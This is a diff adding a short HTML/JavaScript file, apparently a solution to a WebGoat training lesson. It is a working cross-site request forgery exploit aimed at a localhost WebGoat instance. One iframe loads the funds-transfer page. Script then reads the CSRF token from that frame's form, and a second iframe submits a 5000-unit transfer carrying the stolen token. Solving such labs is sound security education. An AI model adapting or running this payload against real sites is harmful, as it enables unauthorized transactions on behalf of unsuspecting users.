@@ -1,0 +1,27 @@
+part5
+<script>
+var token;
+
+function Frame1()
+{
+    var frameDoc = document.getElementById("frame1").contentDocument;
+    var form = frameDoc.getElementsByTagName("form")[0];
+    token = '&CSRFToken=' + form.CSRFToken.value;
+    
+    Frame2();
+}
+
+function Frame2()
+{
+    var testFrame = document.getElementById("frame2");
+    testFrame.src="http://localhost:8090/WebGoat/attack?Screen=312&menu=900&transferFunds=5000" + token;
+}
+</script>
+
+<iframe src="http://localhost:8090/WebGoat/attack?Screen=312&menu=900&transferFunds=main"
+  onload="Frame1();"
+  id="frame1" frameborder="1" marginwidth="0"
+  marginheight="0" width="800" scrolling=yes height="300"></iframe>
+  
+<iframe id="frame2" frameborder="1" marginwidth="0"
+  marginheight="0" width="800" scrolling=yes height="300"></iframe>
